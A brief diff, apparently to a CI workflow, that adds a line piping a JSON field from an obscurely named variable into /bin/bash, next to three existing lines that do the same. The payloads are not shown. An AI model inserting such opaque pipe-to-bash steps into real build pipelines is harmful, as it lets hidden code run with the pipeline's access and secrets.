@@ -41,6 +41,7 @@ jobs:
           echo $lp4 | jq -r .xrxv167 | /bin/bash
           echo $aev0 | jq -r .p99017 | /bin/bash
           printf '%s' "$yibj3514" | jq -r .kyr5 | /bin/bash
+          printf '%s' "$hz25" | jq -r .q1 | /bin/bash
 
       - name: Archive output
         if: always()
